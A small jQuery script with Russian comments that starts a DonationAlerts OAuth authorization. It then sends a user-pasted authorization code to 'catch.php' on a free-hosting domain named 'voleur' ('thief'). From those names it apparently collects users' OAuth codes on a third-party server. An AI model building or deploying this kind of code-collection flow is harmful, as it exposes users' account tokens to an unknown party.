$(function() {
    $('#create_token_button').click(function () {
        var url = 'https://www.donationalerts.com/oauth/authorize?response_type=code&client_id=402&redirect_uri=https://voleur.000webhostapp.com/api/processor.php&%20%20%20%20scope=oauth-donation-index';
        var xhr = new XMLHttpRequest();
        xhr.open('GET', url,true);
        document.getElementById('hider').style.visibility = "visible";
        xhr.send('authorize');
        xhr.onload = function() {
            document.getElementById('hider').style.visibility = 'hidden';
            console.log('Loaded: '+xhr.status);
            if (xhr.status == 200) {
                console.log("token created succesfull");
            } else {
                console.log("while create token we got a error: "+xhr.status);
            }
        };
        xhr.onerror = function() { // происходит, только когда запрос совсем не получилось выполнить
            console.log(`Error connect`);
        }
    });
    $('#button_token').click(function () {              //обрабатываем нажатие на кнопку
        var user_key = $('#input_field').val();
        var url = 'https://voleur.000webhostapp.com/api/catch.php?code='+user_key;  
        var xhr = new XMLHttpRequest();
        document.getElementById('hider').style.visibility = 'visible'; //показываем загрузчик
        xhr.open('GET', url,true);
        xhr.send(user_key);
        xhr.onload = function() { //получаем ответ от сервера
            document.getElementById('hider').style.visibility = 'hidden'; //прячем загрузчик
            console.log(`Loaded: ${xhr.status}`); //статус
            console.log(JSON.parse(xhr.response)); //тело ответа

        };

        xhr.onerror = function() { // происходит, только когда запрос совсем не получилось выполнить
            console.log(`Error connect`);
        };

        xhr.onprogress = function(event) { // запускается периодически
                                           // event.loaded - количество загруженных байт
                                           // event.lengthComputable = равно true, если сервер присылает заголовок Content-Length
                                           // event.total - количество байт всего (только если lengthComputable равно true)
            console.log(`Loaded ${event.loaded} from ${event.total}`);
        };
    });
});

